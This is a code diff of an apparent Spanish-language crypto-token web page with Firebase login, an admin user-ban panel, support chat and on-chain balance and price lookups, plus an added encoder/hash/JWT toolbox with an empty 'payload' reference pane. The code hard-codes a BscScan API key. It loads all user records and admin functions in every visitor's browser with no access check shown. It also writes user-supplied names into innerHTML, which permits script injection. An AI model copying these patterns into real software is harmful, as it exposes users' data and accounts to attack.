+        <div class="klv-row" style="margin-top:8px">
+          <button class="klv-b g" onclick="klvCd('b64e')">BASE64 →</button>
+          <button class="klv-b g" onclick="klvCd('b64d')">← BASE64</button>
+          <button class="klv-b g" onclick="klvCd('hexe')">HEX →</button>
+          <button class="klv-b g" onclick="klvCd('hexd')">← HEX</button>
+          <button class="klv-b g" onclick="klvCd('urle')">URL →</button>
+          <button class="klv-b g" onclick="klvCd('urld')">← URL</button>
+          <button class="klv-b g" onclick="klvCd('rot13')">ROT13</button>
+          <button class="klv-b g" onclick="klvCd('rev')">INVERTIR</button>
+        </div>
+        <pre class="klv-pre" id="k-cdout">—</pre>
+      </div>
+      <div class="klv-card">
+        <h4>Hashes</h4>
+        <div class="klv-row">
+          <input id="k-hin" placeholder="texto" style="flex:1">
+          <select id="k-halg" style="max-width:120px"><option>SHA-1</option><option>SHA-256</option><option>SHA-512</option></select>
+          <button class="klv-b" onclick="klvHash()">HASHEAR</button>
+        </div>
+        <pre class="klv-pre" id="k-hout">—</pre>
+      </div>
+      <div class="klv-card">
+        <h4>JWT</h4>
+        <textarea id="k-jwt" placeholder="token JWT…" style="min-height:80px"></textarea>
+        <div class="klv-row" style="margin-top:8px"><button class="klv-b" onclick="klvJwt()">DECODIFICAR</button></div>
+        <pre class="klv-pre" id="k-jwtout">—</pre>
+      </div>
+    </section>
 
-      const TOKEN_CONTRACT_ADDRESS = "0x44B1c3Cd218D73368AD865C1cf8bd6E1Dd15c59A".toLowerCase();
-      const PANCAKE_ROUTER_ADDRESS = "0x10ED43335D0f0511c7826814731894B72813462D".toLowerCase();
-      const PANCAKE_FACTORY_ADDRESS = "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73".toLowerCase();
-      const WBNB_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c".toLowerCase();
-      const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955".toLowerCase();
+    <section class="klv-pane" id="k-pays">
+      <div class="klv-card"><h4>Referencia rápida</h4><div id="k-paylist"></div></div>
+    </section>
+  </div>
+</div>
 
-      const BSC_RPC_NODES = [
-          "https://bsc-dataseed.binance.org/",
-          "https://bsc-dataseed1.defibit.io/",
-          "https://bsc-dataseed1.ninicoin.io/",
-          "https://rpc.ankr.com/bsc"
-      ];
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js";
+import { getAuth, sendSignInLinkToEmail, isSignInWithEmailLink, signInWithEmailLink, signOut, onAuthStateChanged, GoogleAuthProvider, OAuthProvider, signInWithPopup } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-auth.js";
+import { getFirestore, doc, setDoc, getDoc, onSnapshot, updateDoc, increment, collection, addDoc, query, orderBy, serverTimestamp, setLogLevel, limit } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js";
 
-      const ERC20_ABI = [
-          "function balanceOf(address owner) view returns (uint256)",
-          "function transfer(address to, uint256 amount) returns (bool)",
-          "function approve(address spender, uint256 amount) returns (bool)",
-          "function allowance(address owner, address spender) view returns (uint256)",
-          "function decimals() view returns (uint8)"
-      ];
+setLogLevel('silent');
 
-      const ROUTER_ABI = [
-          "function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) payable returns (uint[] memory amounts)",
-          "function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) returns (uint[] memory amounts)",
-          "function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) returns (uint[] memory amounts)"
-      ];
+const firebaseConfig = { apiKey: "AIzaSyBJoAAzTcWn_K7gXydwwbesG_gERwBq8Us", authDomain: "nexk-131a4.firebaseapp.com", projectId: "nexk-131a4" };
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getFirestore(app);
+const googleProvider = new GoogleAuthProvider();
+const appleProvider = new OAuthProvider('apple.com');
 
-      const FACTORY_ABI = [
-          "function getPair(address tokenA, address tokenB) external view returns (address pair)"
-      ];
+window.usuarioActual = null;
+window.tokensActualesUsuario = 0;
+window.PRECIO_TOKEN_USD = null;
+window.PRECIO_BNB_USD = null;
+window.CAMBIO_24H_PORCENTAJE = null;
+window.walletDireccionConectada = null;
+let walletBalanceRequestId = 0;
+let walletBalanceRefreshTimer = null;
+let swapQuoteRequestId = 0;
+let swapQuoteTimer = null;
+let chatListenerUsuario = null;
+let chatListenerAdmin = null;
+let chatAdminUidActual = null;
 
-      const PAIR_ABI = [
-          "function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast)",
-          "function token0() external view returns (address)"
-      ];
+const TOKEN_CONTRACT_ADDRESS = "0x44B1c3Cd218D73368AD865C1cf8bd6E1Dd15c59A".toLowerCase();
+const PANCAKE_ROUTER_ADDRESS = "0x10ED43335D0f0511c7826814731894B72813462D".toLowerCase();
+const PANCAKE_FACTORY_ADDRESS = "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73".toLowerCase();
+const WBNB_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c".toLowerCase();
+const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955".toLowerCase();
+const MAX_SLIPPAGE_BPS = 100;
+const PUNTOS_BASIS = 10000;
+const BSC_RPC_NODES = ["https://bsc-dataseed.binance.org/","https://bsc-dataseed1.defibit.io/","https://bsc-dataseed1.ninicoin.io/","https://rpc.ankr.com/bsc"];
 
-      async function registrarVisitaPagina() {
-          try {
-              if (!sessionStorage.getItem("nex_visita_contada")) {
-                  const statRef = doc(db, "estadisticas", "general");
-                  await setDoc(statRef, { visitas: increment(1) }, { merge: true });
-                  
-                  await addDoc(collection(db, "visitas_log"), {
-                      fecha: serverTimestamp(),
-                      dispositivo: navigator.userAgent.includes("Mobile") ? "Móvil" : "PC",
-                      plataforma: navigator.platform || "Desconocida"
-                  });
+const ERC20_ABI = [
+  "function balanceOf(address owner) view returns (uint256)",
+  "function transfer(address to, uint256 amount) returns (bool)",
+  "function approve(address spender, uint256 amount) returns (bool)",
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function decimals() view returns (uint8)"
+];
+const ROUTER_ABI = [
+  "function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) payable returns (uint[] memory amounts)",
+  "function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) returns (uint[] memory amounts)",
+  "function getAmountsOut(uint amountIn, address[] calldata path) view returns (uint[] memory amounts)"
+];
+const FACTORY_ABI = ["function getPair(address tokenA, address tokenB) view returns (address pair)"];
+const PAIR_ABI = ["function getReserves() view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast)","function token0() view returns (address)"];
 
-                  sessionStorage.setItem("nex_visita_contada", "true");
-              }
-          } catch(e){}
+async function registrarVisitaPagina() {
+  try {
+    if (!sessionStorage.getItem("nex_visita_contada")) {
+      await setDoc(doc(db, "estadisticas", "general"), { visitas: increment(1) }, { merge: true });
+      await addDoc(collection(db, "visitas_log"), {
+        date: serverTimestamp(),
+        device: navigator.userAgent.includes("Móvil") ? "Móvil" : "PC",
+        platform: navigator.platform || "Desconocido"
+      });
+      sessionStorage.setItem("nex_visita_contada", "true");
+    }
+  } catch(e){}
+}
+registrarVisitaPagina();
+
+onSnapshot(doc(db, "estadisticas", "general"), (snap) => {
+  if (snap.exists() && snap.data().visitas !== undefined) {
+    const el = document.getElementById('adminVisitasCount');
+    if (el) el.innerText = snap.data().visitas;
+  }
+});
+
+onSnapshot(query(collection(db, "visitas_log"), orderBy("date", "desc"), limit(50)), (snap) => {
+  const listaDiv = document.getElementById('listaVisitasAdmin');
+  if(!listaDiv) return;
+  listaDiv.innerHTML = '';
+  snap.forEach(documento => {
+    const d0 = documento.data();
+    const fecha = d0.date ? d0.date.toDate().toLocaleString() : 'Justo ahora...';
+    const d = document.createElement('div');
+    d.style.cssText = "border-bottom:1px solid var(--border-color);padding:5px 0;font-size:11px;color:#fff;display:flex;justify-content:space-between;";
+    d.innerHTML = '<span>🟢 Nueva entrada</span> <span style="color:var(--text-muted);">' + fecha + ' - ' + d0.device + ' (' + d0.platform + ')</span>';
+    listaDiv.appendChild(d);
+  });
+});
+
+async function registrarOActualizarUsuarioDB(u, proveedor = 'email') {
+  if (!u) return;
+  try {
+    const uRef = doc(db, "usuarios", u.uid);
+    const snap = await getDoc(uRef);
+    if (!snap.exists()) {
+      await setDoc(uRef, {
+        uid: u.uid,
+        email: u.email || "Sin Correo",
+        nombre: u.displayName || u.email || "Usuario NEX",
+        proveedor: proveedor,
+        banned: false,
+        fechaRegistro: serverTimestamp()
+      });
+    }
+  } catch(e){}
+}
+
+const actionCodeSettings = { url: window.location.href.split('?')[0], handleCodeInApp: true };
+
+window.enviarCodigoEmail = async function() {
+  const email = document.getElementById('authEmail').value.trim();
+  if(!email) return alert("Ingresa tu correo electrónico.");
+  try {
+    await sendSignInLinkToEmail(auth, email, actionCodeSettings);
+    window.localStorage.setItem('emailForSignIn', email);
+    window.cerrarAuthModal();
+    alert("Te hemos enviado un enlace de confirmación a tu correo. Abre tu correo e ingresa mediante el enlace.");
+  } catch(e) { alert("Error al enviar el enlace: " + e.message); }
+};
+
+async function verificarEnlaceCorreoAcceso() {
+  if (isSignInWithEmailLink(auth, window.location.href)) {
+    let email = window.localStorage.getItem('emailForSignIn');
+    if (!email) email = window.prompt('Por favor confirma tu correo electrónico:');
+    if (email) {
+      try {
+        const res = await signInWithEmailLink(auth, email, window.location.href);
+        window.localStorage.removeItem('emailForSignIn');
+        await registrarOActualizarUsuarioDB(res.user, 'correo-enlace');
+        alert("¡Correo verificado con éxito!");
+      } catch(e) { alert("Error al validar el enlace de confirmación: " + e.message); }
+    }
+  }
+}
+verificarEnlaceCorreoAcceso();
+
+window.ejecutarLoginGoogle = async function() {
+  try {
+    const res = await signInWithPopup(auth, googleProvider);
+    await registrarOActualizarUsuarioDB(res.user, 'google');
+    window.cerrarAuthModal();
+  } catch(e) { alert("Error con Google: " + e.message); }
+};
+
+window.ejecutarLoginApple = async function() {
+  try {
+    const res = await signInWithPopup(auth, appleProvider);
+    await registrarOActualizarUsuarioDB(res.user, 'apple');
+    window.cerrarAuthModal();
+  } catch(e) { alert("Error con Apple: " + e.message); }
+};
+
+window.ejecutarCerrarSesion = async function() {
+  try {
+    localStorage.removeItem("nex_sesion_activa");
+    await signOut(auth);
+    window.location.reload();
+  } catch(e) { alert("Error al cerrar sesión: " + e.message); }
+};
+
+onSnapshot(collection(db, "usuarios"), (snap) => {
+  const listaDiv = document.getElementById('listaUsuariosAdmin');
+  const chatListContainer = document.getElementById('adminChatUsersList');
+  if(listaDiv) listaDiv.innerHTML = '';
+  const usuariosChat = [];
+
+  snap.forEach(documento => {
+    const d0 = documento.data();
+    const correo = d0.email || d0['correo electrónico'] || 'Sin Correo';
+    const bloqueado = d0.banned === true || d0.prohibido === true;
+
+    if (listaDiv) {
+      const d = document.createElement('div');
+      d.className = 'admin-user-card';
+      d.innerHTML =
+        '<div><strong style="font-size:12px;color:var(--primary-cyan);">' + (d0.nombre || 'Usuario') + '</strong>' +
+        '<div style="font-size:11px;color:var(--text-muted);">' + correo + ' | ' + (d0.proveedor || 'Red') + '</div>' +
+        '<div style="font-size:10px;color:' + (bloqueado ? 'var(--red-down)' : 'var(--green-up)') + ';">' + (bloqueado ? '⛔ SUSPENDIDO' : '✅ ACTIVO') + '</div></div>' +
+        '<div><button class="btn-gen" style="background:var(--red-down);color:#fff;border:none;padding:5px 8px;font-weight:bold;" onclick="expulsarUsuarioAdmin(\'' + d0.uid + '\',' + (!bloqueado) + ')">' + (bloqueado ? 'Reactivar' : '🔴 Expulsar') + '</button></div>';
+      listaDiv.appendChild(d);
+    }
+    if (d0.ultimoMensajeAt) usuariosChat.push({ d0, correo });
+  });
+
+  usuariosChat.sort((a,b) => (b.d0.ultimoMensajeAt?.toMillis()||0) - (a.d0.ultimoMensajeAt?.toMillis()||0));
+
+  if(chatListContainer) {
+    chatListContainer.innerHTML = '';
+    if(usuariosChat.length === 0) chatListContainer.innerHTML = '<p style="color:var(--text-muted);font-size:12px;">No hay mensajes de usuarios aún.</p>';
+    usuariosChat.forEach(({ d0, correo }) => {
+      const div = document.createElement('div');
+      div.style.cssText = "background:var(--bg-dark);padding:10px;border-radius:6px;border:1px solid var(--border-color);cursor:pointer;display:flex;justify-content:space-between;align-items:center;transition:background .2s;";
+      div.onmouseover = () => div.style.background = 'rgba(56,189,248,.1)';
+      div.onmouseout = () => div.style.background = 'var(--bg-dark)';
+      div.onclick = () => window.abrirChatUsuarioAdmin(d0.uid, d0.nombre || correo);
+      const dot = d0.unreadAdmin ? '<span style="color:#10b981;font-size:16px;" title="Nuevo mensaje">🟢</span>' : '';
+      div.innerHTML = '<div style="display:flex;flex-direction:column;"><strong style="color:var(--text-main);font-size:13px;">' + (d0.nombre || correo) + '</strong><span style="font-size:11px;color:var(--text-muted);">' + correo + '</span></div><div>' + dot + '</div>';
+      chatListContainer.appendChild(div);
+    });
+  }
+});
+
+window.expulsarUsuarioAdmin = async function(uid, banStatus) {
+  try {
+    await updateDoc(doc(db, "usuarios", uid), { banned: banStatus, prohibido: banStatus });
+    alert(banStatus ? "Usuario expulsado y bloqueado." : "Acceso reactivado.");
+  } catch(e) { alert("Error al cambiar estado del usuario: " + e.message); }
+};
+
+function escucharChatUsuario(uid) {
+  if (chatListenerUsuario) chatListenerUsuario();
+  const q = query(collection(db, "chats", uid, "mensajes"), orderBy("timestamp", "asc"));
+  chatListenerUsuario = onSnapshot(q, (snap) => {
+    const box = document.getElementById('userChatBox');
+    if(!box) return;
+    box.innerHTML = '';
+    snap.forEach(m => {
+      const d0 = m.data();
+      const div = document.createElement('div');
+      div.className = 'chat-msg ' + (d0.sender === 'admin' ? 'msg-admin' : 'msg-user');
+      div.innerText = d0.text || d0.texto;
+      box.appendChild(div);
+    });
+    box.scrollTop = box.scrollHeight;
+  });
+}
+
+window.enviarMensajeSoporte = async function() {
+  const input = document.getElementById('userChatMessage');
+  const msg = input.value.trim();
+  if(!msg || !window.usuarioActual) return;
+  try {
+    await addDoc(collection(db, "chats", window.usuarioActual.uid, "mensajes"), {
+      text: msg, sender: 'usuario', timestamp: serverTimestamp()
+    });
+    await setDoc(doc(db, "usuarios", window.usuarioActual.uid), { ultimoMensajeAt: serverTimestamp(), unreadAdmin: true }, { merge: true });
+    input.value = '';
+  } catch(e) { alert("Error al enviar mensaje: " + e.message); }
+};
+
+window.abrirChatUsuarioAdmin = async function(uid, nombreUsuario) {
+  chatAdminUidActual = uid;
+  document.getElementById('adminChatListContainer').style.display = 'none';
+  document.getElementById('adminChatActiveContainer').style.display = 'block';
+  document.getElementById('adminChatActiveTitle').innerText = "Chat con " + nombreUsuario;
+  try { await setDoc(doc(db, "usuarios", uid), { unreadAdmin: false }, { merge: true }); } catch(e){}
+
+  if (chatListenerAdmin) chatListenerAdmin();
+  const q = query(collection(db, "chats", uid, "mensajes"), orderBy("timestamp", "asc"));
+  chatListenerAdmin = onSnapshot(q, (snap) => {
+    const box = document.getElementById('adminChatBox');
+    if(!box) return;
+    box.innerHTML = '';
+    snap.forEach(m => {
+      const d0 = m.data();
+      const div = document.createElement('div');
+      div.className = 'chat-msg ' + (d0.sender === 'admin' ? 'msg-admin' : 'msg-user');
+      div.innerText = d0.text || d0.texto;
+      box.appendChild(div);
+    });
+    box.scrollTop = box.scrollHeight;
+  });
+};
+
+window.volverListaChatAdmin = function() {
+  chatAdminUidActual = null;
+  if (chatListenerAdmin) { chatListenerAdmin(); chatListenerAdmin = null; }
+  document.getElementById('adminChatActiveContainer').style.display = 'none';
+  document.getElementById('adminChatListContainer').style.display = 'block';
+};
+
+window.enviarRespuestaAdmin = async function() {
+  const uid = chatAdminUidActual;
+  const input = document.getElementById('adminReplyMessage');
+  const msg = input.value.trim();
+  if(!uid || !msg) return alert("Selecciona un usuario y escribe un mensaje.");
+  try {
+    await addDoc(collection(db, "chats", uid, "mensajes"), { text: msg, sender: 'admin', timestamp: serverTimestamp() });
+    await setDoc(doc(db, "usuarios", uid), { unreadAdmin: false }, { merge: true });
+    input.value = '';
+  } catch(e) { alert("Error al enviar respuesta: " + e.message); }
+};
+
+window.guardarAjustesAdmin = async function() {
+  try {
+    await setDoc(doc(db, "configuracion", "general"), {
+      colorBotones: document.getElementById('adminColorMain').value,
+      tradingHabilitado: document.getElementById('adminTradingMode').value,
+      bannerUrl: document.getElementById('adminImageUrl').value.trim(),
+      bannerTexto: document.getElementById('adminBannerText').value.trim(),
+      bannerColor: document.getElementById('adminBannerColor').value,
+      bannerMover: document.getElementById('adminBannerMove').value,
+      bannerPos: document.getElementById('adminImagePosition').value
+    }, { merge: true });
+    alert("Configuración guardada con éxito.");
+  } catch(e) { alert("Error al guardar: " + e.message); }
+};
+
+window.obtenerProveedorBSC = function() {
+  return new ethers.providers.JsonRpcProvider(BSC_RPC_NODES[0]);
+};
+
+window.formatearMoneda = function(valor, maxDec = 8) {
+  if (isNaN(valor) || valor === 0) return "0.00";
+  if (valor < 0.000001) return valor.toFixed(maxDec);
+  if (valor < 0.01) return valor.toFixed(6);
+  if (valor < 1) return valor.toFixed(4);
+  return valor.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 4 });
+};
+
+function formatearSaldoReal(balanceWei, decimals, symbol) {
+  const exact = ethers.utils.formatUnits(balanceWei, decimals);
+  const numeric = Number(exact);
+  let display = new Intl.NumberFormat('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 8 }).format(numeric);
+  if (!balanceWei.isZero() && numeric < 0.000000005) display = '< 0.00000001';
+  return { exact, display: display + ' ' + symbol };
+}
+
+function mostrarWalletSinConectar() {
+  walletBalanceRequestId++;
+  window.tokensActualesUsuario = 0;
+  const a = document.getElementById('userUsdtBalance');
+  const b = document.getElementById('userBnbBalance');
+  const c = document.getElementById('userUsdtBalanceNote');
+  const d = document.getElementById('userBnbBalanceNote');
+  const e = document.getElementById('userTokens');
+  if (a) a.innerText = 'Conecta la billetera';
+  if (b) b.innerText = 'Conecta la billetera';
+  if (c) c.innerText = 'Saldo en BNB Smart Chain; actualiza cada 30 s';
+  if (d) d.innerText = 'Saldo en BNB Smart Chain; actualiza cada 30 s';
+  if (e) e.innerText = 'Conecta la billetera';
+}
+
+window.actualizarSaldosReales = async function(address = window.walletDireccionConectada) {
+  const usdtElem = document.getElementById('userUsdtBalance');
+  const bnbElem = document.getElementById('userBnbBalance');
+  const usdtNote = document.getElementById('userUsdtBalanceNote');
+  const bnbNote = document.getElementById('userBnbBalanceNote');
+
+  if (!address) { mostrarWalletSinConectar(); return; }
+
+  let walletAddress;
+  try { walletAddress = ethers.utils.getAddress(address); }
+  catch (error) {
+    if (usdtElem) usdtElem.innerText = 'Dirección inválida';
+    if (bnbElem) bnbElem.innerText = 'Dirección inválida';
+    return;
+  }
+
+  const requestId = ++walletBalanceRequestId;
+  if (usdtElem) usdtElem.innerText = 'Consultando...';
+  if (bnbElem) bnbElem.innerText = 'Consultando...';
+  if (usdtNote) usdtNote.innerText = 'Lectura directa de BNB Smart Chain';
+  if (bnbNote) bnbNote.innerText = 'Lectura directa de BNB Smart Chain';
+
+  try {
+    const provider = window.obtenerProveedorBSC();
+    const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, provider);
+    const [bnbResult, usdtBalanceResult, usdtDecimalsResult] = await Promise.allSettled([
+      provider.getBalance(walletAddress),
+      usdtContract.balanceOf(walletAddress),
+      usdtContract.decimals()
+    ]);
+
+    if (requestId !== walletBalanceRequestId || window.walletDireccionConectada !== walletAddress) return;
+
+    if (usdtBalanceResult.status === 'fulfilled' && usdtDecimalsResult.status === 'fulfilled') {
+      const usdt = formatearSaldoReal(usdtBalanceResult.value, Number(usdtDecimalsResult.value), 'USDT');
+      if (usdtElem) { usdtElem.innerText = usdt.display; usdtElem.title = usdt.exact + ' USDT'; }
+      if (usdtNote) usdtNote.innerText = 'Saldo exacto en BNB Smart Chain; actualiza cada 30 s';
+    } else {
+      if (usdtElem) usdtElem.innerText = 'No disponible';
+      if (usdtNote) usdtNote.innerText = 'No se pudo consultar el saldo USDT';
+    }
+
+    if (bnbResult.status === 'fulfilled') {
+      const bnb = formatearSaldoReal(bnbResult.value, 18, 'BNB');
+      const bnbAmount = Number(ethers.utils.formatEther(bnbResult.value));
+      if (bnbElem) { bnbElem.innerText = bnb.display; bnbElem.title = bnb.exact + ' BNB'; }
+      if (Number.isFinite(window.PRECIO_BNB_USD) && window.PRECIO_BNB_USD > 0) {
+        if (bnbNote) bnbNote.innerText = '≈ $' + window.formatearMoneda(bnbAmount * window.PRECIO_BNB_USD, 2) + ' USD al precio actual; saldo cada 30 s';
+      } else {
+        if (bnbNote) bnbNote.innerText = 'Cotización USD no disponible; saldo cada 30 s';
       }
-      registrarVisitaPagina();
+    } else {
+      if (bnbElem) bnbElem.innerText = 'No disponible';
+      if (bnbNote) bnbNote.innerText = 'No se pudo consultar el saldo BNB';
+    }
+  } catch (error) {
+    if (requestId !== walletBalanceRequestId) return;
+    if (usdtElem) usdtElem.innerText = 'No disponible';
+    if (bnbElem) bnbElem.innerText = 'No disponible';
+    console.error('Error al consultar saldos reales:', error);
+  }
+};
 
-      onSnapshot(doc(db, "estadisticas", "general"), (snap) => {
-          if (snap.exists() && snap.data().visitas !== undefined) {
-              const countElem = document.getElementById('adminVisitasCount');
-              if (countElem) countElem.innerText = snap.data().visitas;
-          }
-      });
+window.actualizarPrecioTokenEnVivo = async function() {
+  window.PRECIO_BNB_USD = null;
+  window.PRECIO_TOKEN_USD = null;
 
-      onSnapshot(query(collection(db, "visitas_log"), orderBy("fecha", "desc"), limit(50)), (snap) => {
-          const listaDiv = document.getElementById('listaVisitasAdmin');
-          if(!listaDiv) return;
-          listaDiv.innerHTML = '';
-          snap.forEach(documento => {
-              const data = documento.data();
-              const fecha = data.fecha ? data.fecha.toDate().toLocaleString() : 'Justo ahora...';
-              const d = document.createElement('div');
-              d.style.cssText = "border-bottom: 1px solid var(--border-color); padding: 5px 0; font-size: 11px; color: #fff; display: flex; justify-content: space-between;";
-              d.innerHTML = `<span>🟢 Nueva entrada</span> <span style="color:var(--text-muted);">${fecha} - ${data.dispositivo} (${data.plataforma})</span>`;
-              listaDiv.appendChild(d);
-          });
-      });
+  try {
+    const resBnb = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT");
+    if (!resBnb.ok) throw new Error('Cotización BNB respondió ' + resBnb.status);
+    const dataBnb = await resBnb.json();
+    const bnbPrice = Number(dataBnb?.price);
+    if (Number.isFinite(bnbPrice) && bnbPrice > 0) window.PRECIO_BNB_USD = bnbPrice;
+  } catch (error) { console.warn('No se pudo obtener el precio de BNB:', error); }
 
-      async function registrarOActualizarUsuarioDB(u, proveedor = 'email') {
-          if (!u) return;
-          try {
-              const uRef = doc(db, "usuarios", u.uid);
-              const snap = await getDoc(uRef);
-              if (!snap.exists()) {
-                  await setDoc(uRef, {
-                      uid: u.uid,
-                      email: u.email || "Sin Correo",
-                      nombre: u.displayName || u.email || "Usuario NEX",
-                      proveedor: proveedor,
-                      banned: false,
-                      fechaRegistro: serverTimestamp()
-                  });
-              }
-          } catch(e) {}
+  try {
+    const provider = window.obtenerProveedorBSC();
+    const factory = new ethers.Contract(PANCAKE_FACTORY_ADDRESS, FACTORY_ABI, provider);
+    const pairAddress = await factory.getPair(TOKEN_CONTRACT_ADDRESS, WBNB_ADDRESS);
+
+    if (pairAddress && pairAddress !== ethers.constants.AddressZero) {
+      const pairContract = new ethers.Contract(pairAddress, PAIR_ABI, provider);
+      const tokenContract = new ethers.Contract(TOKEN_CONTRACT_ADDRESS, ERC20_ABI, provider);
+      const tokenDecimals = Number(await tokenContract.decimals());
+      const reservas = await pairContract.getReserves();
+      const token0 = await pairContract.token0();
+
+      let reserveBNB, reserveToken;
+      if (token0.toLowerCase() === WBNB_ADDRESS.toLowerCase()) {
+        reserveBNB = parseFloat(ethers.utils.formatEther(reservas.reserve0));
+        reserveToken = parseFloat(ethers.utils.formatUnits(reservas.reserve1, tokenDecimals));
+      } else {
+        reserveBNB = parseFloat(ethers.utils.formatEther(reservas.reserve1));
+        reserveToken = parseFloat(ethers.utils.formatUnits(reservas.reserve0, tokenDecimals));
       }
 
-      const actionCodeSettings = {
-          url: window.location.href.split('?')[0],
-          handleCodeInApp: true,
-      };
-
-      window.enviarCodigoEmail = async function() {
-          const email = document.getElementById('authEmail').value.trim();
-          if(!email) return alert("Ingresa tu correo electrónico.");
-          try {
-              await sendSignInLinkToEmail(auth, email, actionCodeSettings);
-              window.localStorage.setItem('emailForSignIn', email);
-              window.cerrarAuthModal();
-              alert("Te hemos enviado un enlace de confirmación a tu correo. Abre tu correo e ingresa mediante el enlace.");
-          } catch(e) { 
-              alert("Error al enviar el enlace: " + e.message); 
-          }
-      };
-
-      async function verificarEnlaceCorreoAcceso() {
-          if (isSignInWithEmailLink(auth, window.location.href)) {
-              let email = window.localStorage.getItem('emailForSignIn');
-              if (!email) {
-                  email = window.prompt('Por favor confirma tu correo electrónico:');
-              }
-              if (email) {
-                  try {
-                      const res = await signInWithEmailLink(auth, email, window.location.href);
-                      window.localStorage.removeItem('emailForSignIn');
-                      await registrarOActualizarUsuarioDB(res.user, 'correo-enlace');
-                      alert("¡Correo verificado con éxito!");
-                  } catch(e) {
-                      alert("Error al validar el enlace de confirmación: " + e.message);
-                  }
-              }
-          }
+      if (reserveToken > 0 && reserveBNB > 0 && Number.isFinite(window.PRECIO_BNB_USD) && window.PRECIO_BNB_USD > 0) {
+        const tokenPrice = (reserveBNB / reserveToken) * window.PRECIO_BNB_USD;
+        if (Number.isFinite(tokenPrice) && tokenPrice > 0) window.PRECIO_TOKEN_USD = tokenPrice;
       }
-      verificarEnlaceCorreoAcceso();
+    }
+  } catch (error) { console.warn('No se pudo consultar el precio de NEX:', error); }
 
-      window.ejecutarLoginGoogle = async function() {
-          try {
-              const res = await signInWithPopup(auth, googleProvider);
-              await registrarOActualizarUsuarioDB(res.user, 'google');
-              window.cerrarAuthModal();
-          } catch(e) { alert("Error con Google: " + e.message); }
-      };
+  const precioEl = document.getElementById('tokenPrice');
+  if (precioEl) {
+    precioEl.innerText = Number.isFinite(window.PRECIO_TOKEN_USD) && window.PRECIO_TOKEN_USD > 0
+      ? '$' + window.formatearMoneda(window.PRECIO_TOKEN_USD) + ' USD'
+      : 'Precio no disponible';
+  }
+  window.recalcularBalanceUsuario();
+  window.calcularRecepcionNEX();
+};
 
-      window.ejecutarLoginApple = async function() {
-          try {
-              const res = await signInWithPopup(auth, appleProvider);
-              await registrarOActualizarUsuarioDB(res.user, 'apple');
-              window.cerrarAuthModal();
-          } catch(e) { alert("Error con Apple: " + e.message); }
-      };
+window.actualizarCambioPrecio24h = async function() {
+  const profitElem = document.getElementById('userProfit');
+  window.CAMBIO_24H_PORCENTAJE = null;
+  if (profitElem) { profitElem.innerText = '—'; profitElem.style.color = 'var(--text-muted)'; }
 
-      window.ejecutarCerrarSesion = async function() {
-          try {
-              localStorage.removeItem("nex_sesion_activa");
-              await signOut(auth);
-              window.location.reload();
-          } catch(e) {
-              alert("Error al cerrar sesión: " + e.message);
-          }
-      };
+  try {
+    const respuesta = await fetch(
+      'https://api.geckoterminal.com/api/v2/networks/bsc/tokens/' + TOKEN_CONTRACT_ADDRESS + '/pools?page=1',
+      { headers: { accept: 'application/json' } }
+    );
+    if (!respuesta.ok) throw new Error('Datos de mercado respondieron ' + respuesta.status);
+    const datos = await respuesta.json();
+    const pool = datos.data?.find(item => item.attributes?.price_change_percentage?.h24 !== undefined);
+    const cambio = Number(pool?.attributes?.price_change_percentage?.h24);
+    if (!Number.isFinite(cambio)) throw new Error('Variación no disponible');
+    window.CAMBIO_24H_PORCENTAJE = cambio;
+    window.recalcularBalanceUsuario();
+  } catch (error) {
+    console.warn('No se pudo obtener la variación de 24 h:', error);
+    if (profitElem) { profitElem.innerText = 'No disponible'; profitElem.style.color = 'var(--text-muted)'; }
+  }
+};
 
-      onSnapshot(collection(db, "usuarios"), (snap) => {
-          const listaDiv = document.getElementById('listaUsuariosAdmin');
-          const chatListContainer = document.getElementById('adminChatUsersList');
-          if(listaDiv) listaDiv.innerHTML = '';
-          
-          let usuariosChat = [];
+window.cargarHistorialOnChainReal = async function(address) {
+  const lista = document.getElementById('historialLista');
+  if (!address || !lista) return;
+  try {
+    lista.innerHTML = '<p style="color:var(--text-muted);text-align:center;">Cargando transacciones...</p>';
+    const url = 'https://api.bscscan.com/api?module=account&action=tokentx&contractaddress=' + TOKEN_CONTRACT_ADDRESS + '&address=' + address + '&page=1&offset=25&sort=desc&apikey=YHQ8E3F2X85FUDZ5XZS4H1B45476R24XV6';
+    const res = await fetch(url);
+    const data = await res.json();
 
-          snap.forEach(documento => {
-              const data = documento.data();
-              
-              if (listaDiv) {
-                  const d = document.createElement('div');
-                  d.className = 'admin-user-card';
-                  d.innerHTML = `
-                      <div>
-                          <strong style="font-size:12px; color:var(--primary-cyan);">${data.nombre || 'Usuario'}</strong>
-                          <div style="font-size:11px; color:var(--text-muted);">${data.email || 'Sin Correo'} | ${data.proveedor || 'Red'}</div>
-                          <div style="font-size:10px; color:${data.banned ? 'var(--red-down)' : 'var(--green-up)'};">${data.banned ? '⛔ SUSPENDIDO' : '✅ ACTIVO'}</div>
-                      </div>
-                      <div>
-                          <button class="btn-gen" style="background:var(--red-down); color:white; border:none; padding:5px 8px; font-weight:bold;" onclick="expulsarUsuarioAdmin('${data.uid}', ${!data.banned})">
